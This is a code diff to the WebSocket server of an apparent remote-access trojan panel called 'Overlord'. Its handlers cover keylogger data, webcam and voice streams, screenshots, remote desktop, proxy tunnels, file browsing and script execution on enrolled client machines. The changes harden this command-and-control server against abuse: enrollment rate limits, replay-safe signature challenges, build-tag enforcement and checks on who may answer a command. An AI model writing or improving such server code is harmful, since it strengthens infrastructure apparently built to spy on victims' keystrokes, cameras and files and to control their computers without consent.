@@ -9,7 +9,7 @@ async function getGeoip() {
 }
 import { logAudit, AuditAction } from "../../auditLog";
 import * as clientManager from "../../clientManager";
-import { clientExists, setOnlineState, setOfflineStates, upsertClientRow, getClientEnrollmentStatus, setClientEnrollmentStatus, lookupClientByPublicKey, getClientPublicKeyById, getBuild, getBuildByTag, computeClientSuspiciousFlags, type OfflineStateUpdate } from "../../db";
+import { clientExists, setOnlineState, setOfflineStates, upsertClientRow, upsertPendingClientRow, getClientEnrollmentStatus, setClientEnrollmentStatus, lookupClientByPublicKey, getClientPublicKeyById, getClientBuildOwnership, getBuild, getBuildByTag, computeClientSuspiciousFlags, type OfflineStateUpdate } from "../../db";
 import { getConfig } from "../../config";
 import { logger } from "../../logger";
 import { metrics } from "../../metrics";
@@ -241,7 +241,7 @@ type WsLifecycleDeps = {
   handleKeyloggerMessage: (clientId: string, payload: any) => void;
   handleKeylogArchiveMessage?: (clientId: string, payload: any, ws?: ServerWebSocket<SocketData>) => void;
   notifyRdInputLatency: (commandId: string) => void;
-  handleNotificationScreenshotFailure: (commandId: string | undefined, ok: boolean | undefined, message: string | undefined) => void;
+  handleNotificationScreenshotFailure: (commandId: string | undefined, ok: boolean | undefined, message: string | undefined, clientId?: string) => void;
   handlePluginEvent: (clientId: string, payload: any) => void;
   handleNotification: (clientId: string, payload: any) => void;
   handleVoiceUplink: (clientId: string, payload: any) => void;
@@ -289,22 +289,200 @@ type WsLifecycleDeps = {
 };
 
 const ENROLLMENT_TIMEOUT_MS = 30_000;
-const enrollmentTimeouts = new Map<string, ReturnType<typeof setTimeout>>();
+const MAX_PRE_ENROLLMENT_MESSAGE_BYTES = 32 * 1024;
 
-function clearEnrollmentTimeout(clientId: string) {
-  const t = enrollmentTimeouts.get(clientId);
+export type EnrollmentAdmissionLimits = {
+  maxActiveGlobal: number;
+  maxActivePerIp: number;
+  maxVerifyingGlobal: number;
+  verificationAttemptsPerSecond: number;
+  verificationAttemptBurst: number;
+};
+
+export type EnrollmentAdmissionDenial =
+  | "global_socket_limit"
+  | "per_ip_socket_limit"
+  | "not_admitted"
+  | "already_verifying"
+  | "verification_concurrency"
+  | "verification_rate";
+
+type EnrollmentAdmissionDecision =
+  | { ok: true }
+  | { ok: false; reason: EnrollmentAdmissionDenial };
+
+function normalizedAdmissionIp(value: unknown): string {
+  if (typeof value !== "string") return "<unknown>";
+  const clean = value.trim().slice(0, 128);
+  return clean || "<unknown>";
+}
+
+function positiveEnrollmentEnv(
+  name: string,
+  fallback: number,
+  min: number,
+  max: number,
+): number {
+  const parsed = Number(process.env[name]);
+  if (!Number.isSafeInteger(parsed) || parsed < min) return fallback;
+  return Math.min(max, parsed);
+}
+
+export function createEnrollmentAdmissionController(rawLimits: EnrollmentAdmissionLimits) {
+  const normalizeLimit = (value: number): number =>
+    Number.isSafeInteger(value) && value > 0 ? Math.floor(value) : 1;
+  const limits: EnrollmentAdmissionLimits = {
+    maxActiveGlobal: normalizeLimit(rawLimits.maxActiveGlobal),
+    maxActivePerIp: normalizeLimit(rawLimits.maxActivePerIp),
+    maxVerifyingGlobal: normalizeLimit(rawLimits.maxVerifyingGlobal),
+    verificationAttemptsPerSecond: normalizeLimit(rawLimits.verificationAttemptsPerSecond),
+    verificationAttemptBurst: normalizeLimit(rawLimits.verificationAttemptBurst),
+  };
+  const sockets = new Map<object, { ip: string; verifying: boolean }>();
+  const activeByIp = new Map<string, number>();
+  let verifying = 0;
+  let attemptTokens = limits.verificationAttemptBurst;
+  let attemptTokensUpdatedAt = 0;
+
+  function refillAttemptTokens(now: number): void {
+    if (attemptTokensUpdatedAt === 0) {
+      attemptTokensUpdatedAt = now;
+      return;
+    }
+    const elapsedMs = Math.max(0, Math.min(60_000, now - attemptTokensUpdatedAt));
+    attemptTokens = Math.min(
+      limits.verificationAttemptBurst,
+      attemptTokens + elapsedMs * limits.verificationAttemptsPerSecond / 1_000,
+    );
+    attemptTokensUpdatedAt = now;
+  }
+
+  return {
+    admit(socket: object, ipValue: unknown): EnrollmentAdmissionDecision {
+      if (sockets.has(socket)) return { ok: true };
+      const ip = normalizedAdmissionIp(ipValue);
+      if (sockets.size >= limits.maxActiveGlobal) {
+        return { ok: false, reason: "global_socket_limit" };
+      }
+      const ipActive = activeByIp.get(ip) || 0;
+      if (ipActive >= limits.maxActivePerIp) {
+        return { ok: false, reason: "per_ip_socket_limit" };
+      }
+      sockets.set(socket, { ip, verifying: false });
+      activeByIp.set(ip, ipActive + 1);
+      return { ok: true };
+    },
+
+    beginVerification(socket: object, now = Date.now()): EnrollmentAdmissionDecision {
+      const entry = sockets.get(socket);
+      if (!entry) return { ok: false, reason: "not_admitted" };
+      if (entry.verifying) return { ok: false, reason: "already_verifying" };
+      if (verifying >= limits.maxVerifyingGlobal) {
+        return { ok: false, reason: "verification_concurrency" };
+      }
+      refillAttemptTokens(now);
+      if (attemptTokens < 1) {
+        return { ok: false, reason: "verification_rate" };
+      }
+      attemptTokens -= 1;
+      entry.verifying = true;
+      verifying += 1;
+      return { ok: true };
+    },
+
+    release(socket: object): boolean {
+      const entry = sockets.get(socket);
+      if (!entry) return false;
+      sockets.delete(socket);
+      if (entry.verifying) verifying = Math.max(0, verifying - 1);
+      const ipActive = Math.max(0, (activeByIp.get(entry.ip) || 0) - 1);
+      if (ipActive === 0) activeByIp.delete(entry.ip);
+      else activeByIp.set(entry.ip, ipActive);
+      return true;
+    },
+
+    stats(ipValue?: unknown) {
+      const ip = ipValue === undefined ? undefined : normalizedAdmissionIp(ipValue);
+      return {
+        active: sockets.size,
+        verifying,
+        activeForIp: ip === undefined ? undefined : (activeByIp.get(ip) || 0),
+        attemptTokens,
+      };
+    },
+  };
+}
+
+const enrollmentAdmission = createEnrollmentAdmissionController({
+  // These defaults allow a large fleet to reconnect in bursts while bounding
+  // attacker-retained challenges and expensive signature/build verification.
+  maxActiveGlobal: positiveEnrollmentEnv("OVERLORD_MAX_PREAUTH_SOCKETS_GLOBAL", 100_000, 32, 100_000),
+  maxActivePerIp: positiveEnrollmentEnv("OVERLORD_MAX_PREAUTH_SOCKETS_PER_IP", 10_000, 8, 10_000),
+  maxVerifyingGlobal: positiveEnrollmentEnv("OVERLORD_MAX_ENROLLMENT_VERIFICATIONS", 4_096, 4, 4_096),
+  verificationAttemptsPerSecond: positiveEnrollmentEnv(
+    "OVERLORD_ENROLLMENT_VERIFICATION_ATTEMPTS_PER_SECOND",
+    100_000,
+    8,
+    100_000,
+  ),
+  verificationAttemptBurst: positiveEnrollmentEnv(
+    "OVERLORD_ENROLLMENT_VERIFICATION_ATTEMPT_BURST",
+    200_000,
+    16,
+    200_000,
+  ),
+});
+
+export function getEnrollmentAdmissionStats(ip?: string) {
+  return enrollmentAdmission.stats(ip);
+}
+
+function clearEnrollmentTimeout(ws: ServerWebSocket<SocketData>) {
+  const t = ws.data.enrollmentTimeout;
   if (t) {
     clearTimeout(t);
-    enrollmentTimeouts.delete(clientId);
+    ws.data.enrollmentTimeout = undefined;
+  }
+}
+
+function releaseEnrollmentAdmission(ws: ServerWebSocket<SocketData>): void {
+  enrollmentAdmission.release(ws);
+}
+
+function rejectEnrollment(ws: ServerWebSocket<SocketData>): void {
+  ws.data.enrollmentState = "rejected";
+  ws.data.enrollmentNonce = undefined;
+  clearEnrollmentTimeout(ws);
+  releaseEnrollmentAdmission(ws);
+}
+
+const enrollmentAdmissionWarningAt = new Map<EnrollmentAdmissionDenial, number>();
+
+function warnEnrollmentAdmissionDenied(reason: EnrollmentAdmissionDenial): void {
+  const now = Date.now();
+  const last = enrollmentAdmissionWarningAt.get(reason) || 0;
+  if (now - last < 5_000) return;
+  enrollmentAdmissionWarningAt.set(reason, now);
+  logger.warn(`[purgatory] enrollment admission denied reason=${reason}`);
+}
+
+export function decodeCanonicalBase64(value: unknown, expectedBytes: number): Uint8Array<ArrayBuffer> | null {
+  if (typeof value !== "string" || value.length === 0 || value.length > 256) return null;
+  try {
+    const decoded = Buffer.from(value, "base64");
+    if (decoded.length !== expectedBytes || decoded.toString("base64") !== value) return null;
+    return Uint8Array.from(decoded);
+  } catch {
+    return null;
   }
 }
 
 async function verifyEd25519(publicKeyBase64: string, signatureBase64: string, nonceBase64: string): Promise<boolean> {
   try {
-    const pubKeyBytes = Buffer.from(publicKeyBase64, "base64");
-    const sigBytes = Buffer.from(signatureBase64, "base64");
-    const nonceBytes = Buffer.from(nonceBase64, "base64");
-    if (pubKeyBytes.length !== 32 || sigBytes.length !== 64) return false;
+    const pubKeyBytes = decodeCanonicalBase64(publicKeyBase64, 32);
+    const sigBytes = decodeCanonicalBase64(signatureBase64, 64);
+    const nonceBytes = decodeCanonicalBase64(nonceBase64, 32);
+    if (!pubKeyBytes || !sigBytes || !nonceBytes) return false;
     const key = await crypto.subtle.importKey(
       "raw",
       pubKeyBytes,
@@ -326,8 +504,81 @@ function computeKeyFingerprint(publicKeyBase64: string): string {
 
 function sanitizeCrashString(value: unknown, maxLen: number): string | undefined {
   if (typeof value !== "string") return undefined;
-  const clean = value.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "").trim();
-  return clean ? clean.slice(0, maxLen) : undefined;
+  const clean = value.slice(0, maxLen).replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "").trim();
+  return clean || undefined;
+}
+
+export const MAX_DISCONNECT_REASON_LENGTH = 128;
+export const MAX_DISCONNECT_DETAIL_LENGTH = 4_096;
+
+export function normalizeDisconnectInfo(payload: unknown): {
+  reason: string;
+  detail?: string;
+} | null {
+  if (!payload || typeof payload !== "object") return null;
+  const data = payload as Record<string, unknown>;
+  const reason = typeof data.reason === "string"
+    ? data.reason
+        .slice(0, MAX_DISCONNECT_REASON_LENGTH)
+        .replace(/[\x00-\x1F\x7F]+/g, " ")
+        .replace(/\s+/g, " ")
+        .trim()
+    : "";
+  if (!reason) return null;
+  const detail = sanitizeCrashString(data.detail, MAX_DISCONNECT_DETAIL_LENGTH);
+  return { reason, ...(detail ? { detail } : {}) };
+}
+
+export const MAX_PROXY_TUNNEL_CHUNK_BYTES = 64 * 1024 * 1024;
+
+export function normalizeProxyTunnelChunk(value: unknown): Uint8Array | null {
+  let bytes: Uint8Array;
+  if (value instanceof Uint8Array) bytes = value;
+  else if (value instanceof ArrayBuffer) bytes = new Uint8Array(value);
+  else if (ArrayBuffer.isView(value)) {
+    bytes = new Uint8Array(value.buffer, value.byteOffset, value.byteLength);
+  } else {
+    return null;
+  }
+  return bytes.byteLength > 0 && bytes.byteLength <= MAX_PROXY_TUNNEL_CHUNK_BYTES
+    ? bytes
+    : null;
+}
+
+const CLIENT_INGRESS_BYTE_BURST = 128 * 1024 * 1024;
+const CLIENT_INGRESS_BYTES_PER_SECOND = 32 * 1024 * 1024;
+const CLIENT_INGRESS_MESSAGE_BURST = 512;
+const CLIENT_INGRESS_MESSAGES_PER_SECOND = 256;
+
+export function consumeClientIngressBudget(
+  data: SocketData,
+  size: number,
+  now = Date.now(),
+): boolean {
+  if (!Number.isFinite(size) || size < 0) return false;
+  const previous = Number.isFinite(data.ingressBudgetUpdatedAt)
+    ? data.ingressBudgetUpdatedAt!
+    : now;
+  const elapsedMs = Math.max(0, Math.min(60_000, now - previous));
+  const byteTokens = Math.min(
+    CLIENT_INGRESS_BYTE_BURST,
+    (Number.isFinite(data.ingressByteTokens) ? data.ingressByteTokens! : CLIENT_INGRESS_BYTE_BURST)
+      + elapsedMs * CLIENT_INGRESS_BYTES_PER_SECOND / 1000,
+  );
+  const messageTokens = Math.min(
+    CLIENT_INGRESS_MESSAGE_BURST,
+    (Number.isFinite(data.ingressMessageTokens) ? data.ingressMessageTokens! : CLIENT_INGRESS_MESSAGE_BURST)
+      + elapsedMs * CLIENT_INGRESS_MESSAGES_PER_SECOND / 1000,
+  );
+  data.ingressBudgetUpdatedAt = now;
+  if (size > byteTokens || messageTokens < 1) {
+    data.ingressByteTokens = byteTokens;
+    data.ingressMessageTokens = messageTokens;
+    return false;
+  }
+  data.ingressByteTokens = byteTokens - size;
+  data.ingressMessageTokens = messageTokens - 1;
+  return true;
 }
 
 export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLifecycleDeps): void {
@@ -348,6 +599,14 @@ export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLif
   if (role === "notifications_viewer") return deps.handleNotificationViewerOpen(ws);
   if (role === "chat_viewer") return deps.handleChatViewerOpen(ws);
 
+  const admission = enrollmentAdmission.admit(ws, ip);
+  if (!admission.ok) {
+    warnEnrollmentAdmissionDenied(admission.reason);
+    rejectEnrollment(ws);
+    try { ws.close(1013, "Enrollment capacity reached"); } catch {}
+    return;
+  }
+
   const id = clientId || uuidv4();
   ws.data.clientId = id;
   ws.data.ip = ip;
@@ -356,17 +615,25 @@ export function handleWebSocketOpen(ws: ServerWebSocket<SocketData>, deps: WsLif
   crypto.getRandomValues(nonceBytes);
   const nonceBase64 = Buffer.from(nonceBytes).toString("base64");
   ws.data.enrollmentNonce = nonceBase64;
+  ws.data.enrollmentState = "challenged";
 
-  ws.send(encodeMessage({ type: "enrollment_challenge", nonce: nonceBase64 }));
+  try {
+    ws.send(encodeMessage({ type: "enrollment_challenge", nonce: nonceBase64 }));
+  } catch {
+    rejectEnrollment(ws);
+    try { ws.close(1011, "Enrollment challenge failed"); } catch {}
+    return;
+  }
 
-  clearEnrollmentTimeout(id);
+  clearEnrollmentTimeout(ws);
   const timeout = setTimeout(() => {
-    enrollmentTimeouts.delete(id);
+    ws.data.enrollmentTimeout = undefined;
+    rejectEnrollment(ws);
     try {
       ws.close(4002, "enrollment_timeout");
     } catch {}
   }, ENROLLMENT_TIMEOUT_MS);
-  enrollmentTimeouts.set(id, timeout);
+  ws.data.enrollmentTimeout = timeout;
 }
 
 export async function handleWebSocketMessage(
@@ -379,12 +646,14 @@ export async function handleWebSocketMessage(
   const limit = getMaxPayloadLimit(role, deps.maxClientPayloadBytes, deps.maxViewerPayloadBytes);
   if (size > limit) {
     logger.warn(`[ws] closing socket due to oversized message (${size} > ${limit}) role=${role || "unknown"}`);
+    if (role === "client" && ws.data.enrollmentState !== "authenticated") {
+      rejectEnrollment(ws);
+    }
     try {
       ws.close(1009, "Message too large");
     } catch {}
     return;
   }
-
   const socketRole = ws.data.role as string;
   if (isAuthenticatedViewerRole(ws.data.role) && !validateViewerAuthorization(ws)) return;
   if (socketRole === "console_viewer") return deps.handleConsoleViewerMessage(ws, message);
@@ -399,6 +668,19 @@ export async function handleWebSocketMessage(
   if (socketRole === "notifications_viewer") return;
   if (socketRole === "dashboard_viewer") return;
   if (socketRole === "chat_viewer") return deps.handleChatViewerMessage(ws, message);
+
+  if (
+    socketRole === "client"
+    && ws.data.enrollmentState !== "authenticated"
+    && size > MAX_PRE_ENROLLMENT_MESSAGE_BYTES
+  ) {
+    logger.warn(
+      `[purgatory] closing pre-enrollment socket due to oversized message (${size} > ${MAX_PRE_ENROLLMENT_MESSAGE_BYTES})`,
+    );
+    rejectEnrollment(ws);
+    try { ws.close(1009, "Pre-enrollment message too large"); } catch {}
+    return;
+  }
 
   const { clientId, ip } = ws.data;
 
@@ -420,36 +702,87 @@ export async function handleWebSocketMessage(
     return;
   }
 
+  if (
+    socketRole === "client"
+    && payloadType !== "hello"
+    && ws.data.enrollmentState !== "authenticated"
+  ) {
+    logger.warn(`[purgatory] rejected ${payloadType} before hello completed for ${clientId}`);
+    rejectEnrollment(ws);
+    try { ws.close(4002, "hello_required"); } catch {}
+    return;
+  }
+
+  if (socketRole === "client" && ws.data.enrollmentState === "authenticated") {
+    const current = clientManager.getClient(clientId);
+    if (!current || current.ws !== ws) {
+      logger.warn(`[purgatory] rejected message from superseded socket for ${clientId}`);
+      rejectEnrollment(ws);
+      try { ws.close(4004, "superseded"); } catch {}
+      return;
+    }
+  }
+
   const info = clientManager.getClient(clientId);
 
   if (!info && payloadType !== "hello") return;
-  if (info) info.lastSeen = Date.now();
+  if (info && ws.data.enrollmentState === "authenticated") {
+    info.lastSeen = Date.now();
+  }
 
   const client = info!;
 
   try {
     switch (payloadType) {
       case "hello": {
-        clearEnrollmentTimeout(clientId);
+        const publicKeyInput = typeof (payload as any).publicKey === "string" ? (payload as any).publicKey : "";
+        const signatureInput = typeof (payload as any).signature === "string" ? (payload as any).signature : "";
+        const nonce = ws.data.enrollmentNonce;
 
-        const publicKey = typeof (payload as any).publicKey === "string" ? (payload as any).publicKey : "";
-        const signature = typeof (payload as any).signature === "string" ? (payload as any).signature : "";
-        const nonce = ws.data.enrollmentNonce || "";
+        if (ws.data.enrollmentState !== "challenged" || !nonce) {
+          logger.warn(`[purgatory] unexpected second hello for ${clientId}`);
+          if (ws.data.enrollmentState !== "authenticated") {
+            rejectEnrollment(ws);
+          } else {
+            ws.data.enrollmentNonce = undefined;
+            clearEnrollmentTimeout(ws);
+          }
+          try { ws.close(4002, "unexpected_hello"); } catch {}
+          return;
+        }
 
-        if (!publicKey || !signature || !nonce) {
+        // Consume the one-time challenge synchronously, before signature
+        // verification yields, so concurrent hello messages cannot replay it.
+        ws.data.enrollmentState = "verifying";
+        ws.data.enrollmentNonce = undefined;
+
+        const publicKeyBytes = decodeCanonicalBase64(publicKeyInput, 32);
+        const signatureBytes = decodeCanonicalBase64(signatureInput, 64);
+        if (!publicKeyBytes || !signatureBytes) {
           logger.warn(`[purgatory] missing publicKey/signature/nonce for ${clientId}`);
+          rejectEnrollment(ws);
           try { ws.close(4002, "invalid_signature"); } catch {}
+          return;
+        }
+        const publicKey = publicKeyInput;
+        const signature = signatureInput;
+
+        const verificationAdmission = enrollmentAdmission.beginVerification(ws);
+        if (!verificationAdmission.ok) {
+          warnEnrollmentAdmissionDenied(verificationAdmission.reason);
+          rejectEnrollment(ws);
+          try { ws.close(1013, "Enrollment verification capacity reached"); } catch {}
           return;
         }
 
         const valid = await verifyEd25519(publicKey, signature, nonce);
+        if (ws.data.enrollmentState !== "verifying") return;
         if (!valid) {
           logger.warn(`[purgatory] invalid signature for ${clientId}`);
+          rejectEnrollment(ws);
           try { ws.close(4002, "invalid_signature"); } catch {}
           return;
         }
-
-        ws.data.enrollmentNonce = undefined;
 
         const keyFingerprint = computeKeyFingerprint(publicKey);
 
@@ -461,12 +794,10 @@ export async function handleWebSocketMessage(
           ws.data.clientId = existing.id;
         } else {
           enrollmentStatus = "pending";
-
-          const existingPk = getClientPublicKeyById(ws.data.clientId);
-          if (existingPk && existingPk !== publicKey) {
-            ws.data.clientId = keyFingerprint;
-            logger.info(`[purgatory] ID collision detected — reassigned to ${keyFingerprint}`);
-          }
+          // Client IDs are attacker-controlled at the upgrade URL. Persist a
+          // canonical identity derived from the proved key for every fresh
+          // enrollment, not only when a claimed ID happens to collide.
+          ws.data.clientId = keyFingerprint;
         }
 
         if (enrollmentStatus !== "approved" && enrollmentStatus !== "denied" && enrollmentStatus !== "pending") {
@@ -474,10 +805,19 @@ export async function handleWebSocketMessage(
           enrollmentStatus = "pending";
         }
 
-        const resolvedId = ws.data.clientId;
-        const buildTag = typeof (payload as any).buildTag === "string"
+        let resolvedId = ws.data.clientId;
+        const reportedBuildTag = typeof (payload as any).buildTag === "string"
           ? (payload as any).buildTag.trim()
           : "";
+        const storedBuildTag = existing
+          ? getClientBuildOwnership(existing.id)?.buildTag || ""
+          : "";
+        const buildTag = storedBuildTag || reportedBuildTag;
+        if (storedBuildTag && reportedBuildTag !== storedBuildTag) {
+          logger.warn(
+            `[build-block] client ${resolvedId} reported a changed or missing build tag; enforcing its enrolled build identity`,
+          );
+        }
 
         let resolvedBuildId: string | null = null;
         let builtByUserId: number | undefined;
@@ -486,6 +826,7 @@ export async function handleWebSocketMessage(
 
         if (buildTag) {
           const verified = await verifyBuildToken(buildTag);
+          if (ws.data.enrollmentState !== "verifying") return;
           if (verified) {
             resolvedBuildId = verified.bid;
             builtByUserId = verified.uid ?? undefined;
@@ -521,6 +862,7 @@ export async function handleWebSocketMessage(
               }),
             );
           } catch {}
+          rejectEnrollment(ws);
           try { ws.close(4007, "build_blocked"); } catch {}
           return;
         }
@@ -528,6 +870,7 @@ export async function handleWebSocketMessage(
         if (enrollmentStatus === "denied") {
           logger.info(`[purgatory] denied client ${resolvedId} tried to connect`);
           ws.send(encodeMessage({ type: "enrollment_status", status: "denied" }));
+          rejectEnrollment(ws);
           try { ws.close(4003, "denied"); } catch {}
           return;
         }
@@ -561,10 +904,10 @@ export async function handleWebSocketMessage(
 
           if (enrollmentStatus !== "approved") {
           const geoip = await getGeoip();
+          if (ws.data.enrollmentState !== "verifying") return;
           const geo = ip ? geoip.lookup(ip) : undefined;
           const countryRaw = geo?.country || (payload as any).country || "ZZ";
           const country = /^[A-Z]{2}$/i.test(countryRaw) ? countryRaw.toUpperCase() : "ZZ";
-          const initialTagForNewClient = existing || clientExists(resolvedId) ? undefined : initialClientTag;
 
           const _s = (v: unknown, max = 256): string | undefined => {
             if (typeof v !== "string") return undefined;
@@ -576,32 +919,51 @@ export async function handleWebSocketMessage(
             return n >= 0 && n <= 100 ? n : undefined;
           };
           const batteryPercent = _percent((payload as any).batteryPercent);
-          upsertClientRow({
-            id: resolvedId,
-            hwid: _s((payload as any).hwid) || resolvedId,
-            role: "client",
-            ip: ip || undefined,
-            host: _s((payload as any).host),
-            os: _s((payload as any).os),
-            arch: _s((payload as any).arch, 32),
-            version: _s((payload as any).version, 64),
-            user: _s((payload as any).user),
-            monitors: (payload as any).monitors || undefined,
-            cpu: _s((payload as any).cpu),
-            gpu: _s((payload as any).gpu),
-            ram: _s((payload as any).ram, 64),
-            batteryPercent,
-            batteryCharging: batteryPercent !== undefined ? !!(payload as any).batteryCharging : undefined,
-            country,
-            lastSeen: Date.now(),
-            online: 0 as any,
-            publicKey,
-            keyFingerprint,
-            enrollmentStatus: "pending",
-            buildTag: buildTag || undefined,
-            builtByUserId,
-            ...(initialTagForNewClient ? { customTag: initialTagForNewClient } : {}),
-          });
+          const storePendingClient = (targetId: string): boolean => {
+            const initialTagForNewClient = existing || clientExists(targetId)
+              ? undefined
+              : initialClientTag;
+            return upsertPendingClientRow({
+              id: targetId,
+              hwid: _s((payload as any).hwid) || targetId,
+              role: "client",
+              ip: ip || undefined,
+              host: _s((payload as any).host),
+              os: _s((payload as any).os),
+              arch: _s((payload as any).arch, 32),
+              version: _s((payload as any).version, 64),
+              user: _s((payload as any).user),
+              monitors: (payload as any).monitors || undefined,
+              cpu: _s((payload as any).cpu),
+              gpu: _s((payload as any).gpu),
+              ram: _s((payload as any).ram, 64),
+              batteryPercent,
+              batteryCharging: batteryPercent !== undefined ? !!(payload as any).batteryCharging : undefined,
+              country,
+              lastSeen: Date.now(),
+              online: 0 as any,
+              publicKey,
+              keyFingerprint,
+              enrollmentStatus: "pending",
+              buildTag: buildTag || undefined,
+              builtByUserId,
+              ...(initialTagForNewClient ? { customTag: initialTagForNewClient } : {}),
+            });
+          };
+
+          let storedPendingClient = storePendingClient(resolvedId);
+          if (!storedPendingClient && resolvedId !== keyFingerprint) {
+            resolvedId = keyFingerprint;
+            ws.data.clientId = resolvedId;
+            logger.info(`[purgatory] concurrent ID collision detected — reassigned to ${resolvedId}`);
+            storedPendingClient = storePendingClient(resolvedId);
+          }
+          if (!storedPendingClient) {
+            logger.warn(`[purgatory] unable to reserve identity for ${resolvedId}`);
+            rejectEnrollment(ws);
+            try { ws.close(4002, "identity_collision"); } catch {}
+            return;
+          }
 
           logger.info(`[purgatory] client ${resolvedId} is pending approval`);
           ws.send(encodeMessage({ type: "enrollment_status", status: "pending" }));
@@ -625,9 +987,37 @@ export async function handleWebSocketMessage(
               country,
             });
           }
+          rejectEnrollment(ws);
           setTimeout(() => { try { ws.close(4001, "pending"); } catch {} }, 100);
           return;
           }
+        }
+
+        let wasKnown = clientExists(resolvedId);
+        const reserveApprovedIdentity = (targetId: string): boolean => upsertClientRow({
+          id: targetId,
+          publicKey,
+          keyFingerprint,
+          enrollmentStatus: "approved",
+          buildTag: buildTag || undefined,
+          builtByUserId,
+          online: 0 as any,
+          lastSeen: Date.now(),
+        });
+
+        let storedApprovedIdentity = reserveApprovedIdentity(resolvedId);
+        if (!storedApprovedIdentity && resolvedId !== keyFingerprint) {
+          resolvedId = keyFingerprint;
+          ws.data.clientId = resolvedId;
+          wasKnown = clientExists(resolvedId);
+          logger.info(`[purgatory] concurrent approved ID collision detected — reassigned to ${resolvedId}`);
+          storedApprovedIdentity = reserveApprovedIdentity(resolvedId);
+        }
+        if (!storedApprovedIdentity) {
+          logger.warn(`[purgatory] unable to reserve approved identity for ${resolvedId}`);
+          rejectEnrollment(ws);
+          try { ws.close(4002, "identity_collision"); } catch {}
+          return;
         }
 
         const existingClient = clientManager.getClient(resolvedId);
@@ -635,7 +1025,6 @@ export async function handleWebSocketMessage(
           logger.info(`[purgatory] kicking existing socket for ${resolvedId} (superseded)`);
           try { existingClient.ws.close(4004, "superseded"); } catch {}
           clientManager.deleteClient(resolvedId);
-          clearEnrollmentTimeout(resolvedId);
           stopAllProxiesForClient(resolvedId);
           deps.clearPendingNotificationScreenshots(resolvedId);
           deps.clearClientPluginState(resolvedId);
@@ -658,7 +1047,6 @@ export async function handleWebSocketMessage(
           deps.webcamStreamingState.delete(resolvedId);
         }
 
-        const wasKnown = clientExists(resolvedId);
         ws.data.wasKnown = wasKnown;
         const initialTagForNewClient = wasKnown ? undefined : initialClientTag;
 
@@ -675,7 +1063,6 @@ export async function handleWebSocketMessage(
           enrollmentStatus: "approved" as any,
           ...(initialTagForNewClient ? { customTag: initialTagForNewClient } : {}),
         };
-        clientManager.addClient(resolvedId, infoObj);
 
         queueClientDbUpdate({
           id: resolvedId,
@@ -690,6 +1077,27 @@ export async function handleWebSocketMessage(
         });
 
         await handleHello(infoObj, payload as Hello, ws, ip);
+        if (ws.data.enrollmentState !== "verifying") {
+          const current = clientManager.getClient(resolvedId);
+          if (current?.ws === ws) {
+            clientManager.deleteClient(resolvedId);
+            clearClientSyncState(resolvedId);
+          } else if (!current) {
+            clearClientSyncState(resolvedId);
+          }
+          return;
+        }
+        const helloWinner = clientManager.getClient(resolvedId);
+        if (helloWinner?.ws && helloWinner.ws !== ws) {
+          logger.warn(`[purgatory] concurrent hello lost for ${resolvedId}`);
+          rejectEnrollment(ws);
+          try { ws.close(4004, "superseded"); } catch {}
+          return;
+        }
+        ws.data.enrollmentState = "authenticated";
+        clearEnrollmentTimeout(ws);
+        releaseEnrollmentAdmission(ws);
+        clientManager.addClient(resolvedId, infoObj);
         const lastCrashReason = sanitizeCrashString((payload as any).lastCrashReason, 64);
         if (lastCrashReason) {
           deps.handleCrashReport(resolvedId, {
@@ -789,7 +1197,8 @@ export async function handleWebSocketMessage(
             } else if ((payload as any).data instanceof ArrayBuffer) {
               bytes = new Uint8Array((payload as any).data);
             } else if (ArrayBuffer.isView((payload as any).data)) {
-              bytes = new Uint8Array((payload as any).data.buffer);
+              const view = (payload as any).data as ArrayBufferView;
+              bytes = new Uint8Array(view.buffer, view.byteOffset, view.byteLength);
             }
 
             const format = String((payload as any)?.header?.format || "jpeg");
@@ -834,7 +1243,7 @@ export async function handleWebSocketMessage(
       case "command_result":
         if (payloadType === "command_result" && typeof (payload as any).commandId === "string") {
           const pending = deps.pendingCommandReplies.get((payload as any).commandId);
-          if (pending) {
+          if (pending?.clientId === client.id) {
             clearTimeout(pending.timeout);
             pending.resolve({
               ok: Boolean((payload as any).ok),
@@ -850,6 +1259,7 @@ export async function handleWebSocketMessage(
           (payload as any).commandId,
           (payload as any).ok,
           (payload as any).message,
+          client.id,
         );
         deps.handleFileBrowserMessage(client.id, payload);
         if (payloadType === "command_result" && typeof (payload as any).commandId === "string") {
@@ -863,7 +1273,7 @@ export async function handleWebSocketMessage(
       case "client_logs_result":
         if (typeof (payload as any).commandId === "string") {
           const pending = deps.pendingCommandReplies.get((payload as any).commandId);
-          if (pending) {
+          if (pending?.clientId === client.id) {
             clearTimeout(pending.timeout);
             pending.resolve({
               ok: Boolean((payload as any).ok),
@@ -895,6 +1305,7 @@ export async function handleWebSocketMessage(
         const cmdId = (payload as any).commandId;
         if (cmdId && deps.pendingScripts.has(cmdId)) {
           const pending = deps.pendingScripts.get(cmdId)!;
+          if (pending.clientId !== client.id) break;
           clearTimeout(pending.timeout);
           pending.resolve({
             ok: (payload as any).ok,
@@ -953,9 +1364,8 @@ export async function handleWebSocketMessage(
         break;
       case "proxy_data": {
         const connId = (payload as any).connectionId;
-        const tunnelData = (payload as any).data;
-        if (typeof connId === "string" && tunnelData) {
-          const bytes = tunnelData instanceof Uint8Array ? tunnelData : new Uint8Array(tunnelData);
+        const bytes = normalizeProxyTunnelChunk((payload as any).data);
+        if (typeof connId === "string" && connId.length > 0 && connId.length <= 128 && bytes) {
           deps.handleProxyTunnelData(client.id, connId, bytes);
         }
         break;
@@ -968,12 +1378,11 @@ export async function handleWebSocketMessage(
         break;
       }
       case "disconnect_info": {
-        const reason = typeof (payload as any).reason === "string" ? (payload as any).reason : "";
-        const detail = typeof (payload as any).detail === "string" ? (payload as any).detail : "";
-        if (reason) {
-          ws.data.disconnectReason = reason;
-          ws.data.disconnectDetail = detail || undefined;
-          logger.debug(`[disconnect_info] ${client.id} reason=${reason}`);
+        const disconnect = normalizeDisconnectInfo(payload);
+        if (disconnect) {
+          ws.data.disconnectReason = disconnect.reason;
+          ws.data.disconnectDetail = disconnect.detail;
+          logger.debug(`[disconnect_info] ${client.id} reason=${disconnect.reason}`);
         }
         break;
       }
@@ -981,7 +1390,11 @@ export async function handleWebSocketMessage(
         break;
     }
   } catch (err) {
-    logger.error("[message] decode error", err);
+    logger.error("[message] handler error", err);
